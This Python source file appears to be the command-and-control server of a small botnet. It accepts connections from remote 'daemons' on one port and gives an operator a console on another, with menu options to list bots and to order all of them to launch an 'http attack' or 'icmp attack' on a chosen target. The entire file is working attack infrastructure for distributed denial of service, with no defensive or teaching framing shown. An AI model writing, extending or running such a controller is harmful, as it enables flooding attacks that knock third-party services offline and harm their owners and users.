import socket, os, hashlib
from threading import Thread

clients = []
addrDaemon = []

def broadcast(message):
    for c in clients:
        try:
            c.send((message+"\n").encode())
        except:
            c.close()
            remove(c)

def remove(connection):
    if connection in clients:
        clients.remove(connection)

class Server(Thread):
    def __init__(self):
        super(Server, self).__init__()

    def run(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        Port = 65222
        server.bind(('', Port)) 
        server.listen(100)
        
        while True:
            conn, addr = server.accept()
            clients.append(conn)
            addrDaemon.append(addr)
           
        conn.close()
        server.close()

class Admin(Thread):
    def __init__(self):
        super(Admin, self).__init__()
       
    def getLine(self, conn):
        try:
            return conn.recv(1024).decode('UTF-8').strip()
        except:
            conn.close()
            return None

    def sendLine(self, conn, msg):
        try:
            conn.send((msg + "\n").encode())
        except:
            pass    
                    
    def listOptions(self, conn):
        options = '''
            1. list daemon
            2. http attack
            3. icmp attack
            0. exit
        '''
        self.sendLine(conn,options)

    def option1(self, conn):
        self.sendLine(conn, "\n".join([ item[0] for item in addrDaemon ]) )

    def option2(self, conn):
        self.sendLine(conn, "Input your target:")
        host = self.getLine(conn)
        broadcast("1")
        broadcast(host)

    def option3(self, conn):
        self.sendLine(conn, "Input your target:")
        host = self.getLine(conn)
        broadcast("2")
        broadcast(host)

    def run(self):
        s =  socket.socket()
        s.bind(('',65223))
        s.listen(5)
    
        while True:
            c, _ = s.accept()
            
            while True:
                self.listOptions(c)
         
                cmd = self.getLine(c)     
                if cmd == '1':
                    self.option1(c)
                elif cmd == '2':
                    self.option2(c)       
                elif cmd == '3':
                    self.option3(c)
                elif cmd == '0' or cmd == None or cmd == '':
                    c.close()
                    break     
        s.close()        

if __name__ == "__main__":
    thread1 = Server()
    thread2 = Admin()
    thread1.start()
    thread2.start()
